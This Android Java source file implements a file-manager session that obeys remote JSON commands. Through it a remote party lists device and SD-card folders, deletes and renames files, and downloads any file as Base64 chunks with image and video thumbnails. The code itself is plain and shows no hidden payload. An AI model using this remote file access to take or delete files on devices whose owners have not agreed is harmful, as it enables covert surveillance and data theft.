package com.user.side.sessions;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;

import android.webkit.MimeTypeMap;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.user.side.constants.Actions;
import com.user.side.constants.Constants;
import com.user.side.listeners.OnRequestSendMessageListener;
import com.user.side.managers.FilesManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Arrays;

public class FileManagerSession extends Session {
    private static final int CHUNK_SIZE = 4096; // 4 KB
    boolean closing = false;

    public FileManagerSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
        super(context, adminToken, onRequestSendMessageListener, id);
    }

    @Override
    public void onMessageReceived(String message) {
        super.onMessageReceived(message);
        try {
            handleFileAction(message);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void handleFileAction(String message) throws JSONException {
        JSONObject jsonObject = new JSONObject(message);
        String action = jsonObject.getString("action");

        switch (action) {
            case Actions.ACTION_REQUEST_FILE_LIST:
                // Send file list to client
                String filesPath = jsonObject.getString(Constants.FOLDER_PATH_KEY);
                if (filesPath.equals(Constants.MAIN_FILES_PATH)) {
                    sendRootFileList();
                } else {
                    sendFileList(filesPath);
                }
                break;
            case Actions.ACTION_REQUEST_FILE_REMOVE:
                // Remove file
                String filePath = jsonObject.getString(Constants.FILE_PATH_KEY);
                removeFile(filePath);
                break;
            case Actions.ACTION_REQUEST_FILE_RENAME:
                String newName = jsonObject.getString(Constants.NEW_FILE_NAME_KEY);
                String filePath1 = jsonObject.getString(Constants.FILE_PATH_KEY);
                renameFile(filePath1, newName);
                break;
            case Actions.ACTION_REQUEST_DOWNLOAD_FILE:
                String filePath2 = jsonObject.getString(Constants.FILE_PATH_KEY);
                sendFileTransferStartedSignal(filePath2);
                break;
            default:
                break;
        }
    }

    public void removeFile(String filePath) throws JSONException {
        boolean isFileRemoved = false;
        String error = "";
        try {
            isFileRemoved = FilesManager.removeFile(new File(filePath));
        } catch (Exception e) {error = e.toString();
        }

        if (isFileRemoved) {
            sendChangeTypeRemove(filePath);
        } else {
            if (error.isEmpty()) {
                error = "Unknown error";
            }
            sendError(error);
        }
    }

    public void renameFile(String filePath, String newName) throws JSONException {
        boolean isFileRenamed = false;
        String error1 = "";

        try {
            isFileRenamed = FilesManager.renameFile(filePath, newName);
        } catch (Exception e) {error1 = e.toString();
        }

        if (isFileRenamed) {
            sendChangeTypeRename(filePath, newName);
        } else {
            if (error1.isEmpty()) {
                error1 = "Unknown error";
            }
            sendError(error1);
        }
    }

    public void sendFileTransferStartedSignal(String filePath) throws JSONException {
        File file = new File(filePath);

        if (!file.exists()) {
            return;
        }
        if (file.isDirectory()) {
            return;
        }

        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_TRANSFER_STARTED);
        jsonObject.put(Constants.FILE_PATH_KEY, filePath);
        sendMessage(jsonObject.toString());
        sendFile(file);
    }

    private void sendFile(File file) throws JSONException {
        if (file.exists()) {
            new Thread(() -> {
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[CHUNK_SIZE];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        if(closing){
                            break;
                        }
                        sendChunk(file.getAbsolutePath(), buffer, bytesRead);
                    }
                    sendFileTransferCompletedSignal(file);
                } catch (IOException | JSONException e) {
                    try {
                        sendError(e.getMessage());
                    } catch (JSONException jsonException) {
                        jsonException.printStackTrace();
                    }
                }
            }).start();
        } else {
            sendError("File not found");
        }
    }

    public void sendFileTransferCompletedSignal(File file) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_TRANSFER_COMPLETED);
        jsonObject.put(Constants.FILE_PATH_KEY, file.getAbsolutePath());
        sendMessage(jsonObject.toString());
    }

    private void sendChunk(String filePath, byte[] buffer, int bytesRead) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_RECEIVE_FILE_CHUNK);
        jsonObject.put(Constants.FILE_PATH_KEY, filePath);
        jsonObject.put(Constants.FILE_CHUNK_KEY, Base64.encodeToString(buffer, 0, bytesRead, Base64.DEFAULT));
        sendMessage(jsonObject.toString());
    }

    public void sendError(String error) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_ERROR);
        jsonObject.put(Constants.DEVICE_FILE_ERROR_KEY, error);
        sendMessage(jsonObject.toString());
    }

    private void sendChangeTypeRename(String filePath1, String newName) throws JSONException {
        String newPath = filePath1.substring(0, filePath1.lastIndexOf("/") + 1) + newName;
        JSONObject jsonObject = fileToJson(new File(newPath));
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
        jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_UPDATE_KEY);
        jsonObject.put(Constants.DEVICE_OLD_FILE_PATH_KEY, filePath1);
        jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, newPath);
        sendMessage(jsonObject.toString());
    }

    public void sendChangeTypeRemove(String filePath) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
        jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_REMOVE_KEY);
        jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, filePath);
        sendMessage(jsonObject.toString());
    }

    public void sendRootFileList() throws JSONException {
        File[] externalStorageVolumes = ContextCompat.getExternalFilesDirs(context, null);
        File sdCard = null;
        File internalStorage;
        if (externalStorageVolumes.length > 1 && externalStorageVolumes[1] != null) {
            sdCard = externalStorageVolumes[1];
            internalStorage = externalStorageVolumes[0];
        } else {
            internalStorage = externalStorageVolumes[0];
        }

        if (sdCard != null && internalStorage != null) {
            String similar = getSimilar(sdCard, internalStorage);
            if (!similar.isEmpty()) {
                String pureSdCard = sdCard.getAbsolutePath().replace(similar, "");
                String pureInternalStorage = internalStorage.getAbsolutePath().replace(similar, "");
                sdCard = new File(pureSdCard);
                internalStorage = new File(pureInternalStorage);
            }
        } else {
            internalStorage = Environment.getExternalStorageDirectory();
        }

        if (internalStorage != null) {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
            jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "internal_storage");
            jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, internalStorage.length());
            jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, internalStorage.getAbsolutePath());
            jsonObject.put(Constants.DEVICE_FILE_MIME_TYPE_KEY, internalStorage.isDirectory() ? "document/directory" : getMimeType(internalStorage));
            jsonObject.put(Constants.DEVICE_FILE_CREATED_KEY, internalStorage.lastModified());
            jsonObject.put(Constants.DEVICE_FILE_MODIFIED_KEY, internalStorage.lastModified());
            sendMessage(jsonObject.toString());
        }

        if (sdCard != null) {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
            jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "sd_card");
            jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, sdCard.length());
            jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, sdCard.getAbsolutePath());
            jsonObject.put(Constants.DEVICE_FILE_MIME_TYPE_KEY, sdCard.isDirectory() ? "document/directory" : getMimeType(sdCard));
            jsonObject.put(Constants.DEVICE_FILE_CREATED_KEY, sdCard.lastModified());
            jsonObject.put(Constants.DEVICE_FILE_MODIFIED_KEY, sdCard.lastModified());
            sendMessage(jsonObject.toString());
        }

    }


    public String getSimilar(File file1, File file2) {
        String path1 = file1.getAbsolutePath();
        String path2 = file2.getAbsolutePath();

        // Find the longest common substring
        int maxLength = 0;
        int end = 0;

        int[][] table = new int[path1.length()][path2.length()];

        for (int i = 0; i < path1.length(); i++) {
            for (int j = 0; j < path2.length(); j++) {
                if (path1.charAt(i) == path2.charAt(j)) {
                    if (i == 0 || j == 0) {
                        table[i][j] = 1;
                    } else {
                        table[i][j] = table[i - 1][j - 1] + 1;
                    }
                    if (table[i][j] > maxLength) {
                        maxLength = table[i][j];
                        end = i;
                    }
                } else {
                    table[i][j] = 0;
                }
            }
        }

        // Get the longest common substring
        if (maxLength > 0) {
            return path1.substring(end - maxLength + 1, end + 1);
        } else {
            return "";
        }
    }


    public void sendFileList(String filesPath) {
        if (FilesManager.fileExists(filesPath)) {
            File[] files = new File(filesPath).listFiles();

            if (files == null) {
                return;
            }

            Arrays.sort(files);

            Arrays.sort(files, (o1, o2) -> {
                if (o1.isDirectory() && !o2.isDirectory()) {
                    return -1;
                } else if (!o1.isDirectory() && o2.isDirectory()) {
                    return 1;
                }
                return 0;
            });

            new Thread(() -> {
                try {
                    for (File file : files) {
                        if(closing){
                            break;
                        }
                        JSONObject jsonObject = fileToJson(file);
                        jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
                        jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
                        sendMessage(jsonObject.toString());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();

        }
    }

    public JSONObject fileToJson(File file) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, file.getName());
        jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, file.length());
        jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, file.getAbsolutePath());
        String mimeType = file.isDirectory() ? "document/directory" : getMimeType(file);
        if (mimeType.contains("image") || mimeType.contains("video")) {
            String thumbnail = mimeType.contains("video") ? videoToThumbnail(file) : imageToThumbnail(file);
            if (thumbnail != null) {
                jsonObject.put(Constants.DEVICE_FILE_THUMBNAIL_KEY, thumbnail);
            }
        }
        jsonObject.put(Constants.DEVICE_FILE_MIME_TYPE_KEY, mimeType);
        jsonObject.put(Constants.DEVICE_FILE_CREATED_KEY, file.lastModified());
        jsonObject.put(Constants.DEVICE_FILE_MODIFIED_KEY, file.lastModified());
        return jsonObject;
    }

    public String videoToThumbnail(File file) {
        if (file.exists()) {
            Bitmap thumbImage = ThumbnailUtils.createVideoThumbnail(file.getAbsolutePath(), MediaStore.Images.Thumbnails.MINI_KIND);
            // Convert to base64
            if (thumbImage != null) {
                return Base64.encodeToString(bitmapToByteArray(thumbImage), Base64.DEFAULT);
            }
        }
        return null;
    }

    public String imageToThumbnail(File file) {
        if (file.exists()) {
            Bitmap thumbImage = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.getAbsolutePath()),
                    64, 64);
            // Convert to base64
            return Base64.encodeToString(bitmapToByteArray(thumbImage), Base64.DEFAULT);
        }
        return null;
    }

    private byte[] bitmapToByteArray(Bitmap thumbImage) {
        thumbImage = Bitmap.createScaledBitmap(thumbImage, 64, 64, false);
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        thumbImage.compress(Bitmap.CompressFormat.PNG, 100, stream);
        return stream.toByteArray();
    }

    @NonNull
    static String getMimeType(@NonNull File file) {
        String type = null;
        final String extension = file.getName().substring(file.getName().lastIndexOf(".") + 1);
        type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.toLowerCase());
        if (type == null) {
            type = "*/*";
        }
        return type;
    }

    @Override
    public void close() {
        super.close();
    }
}
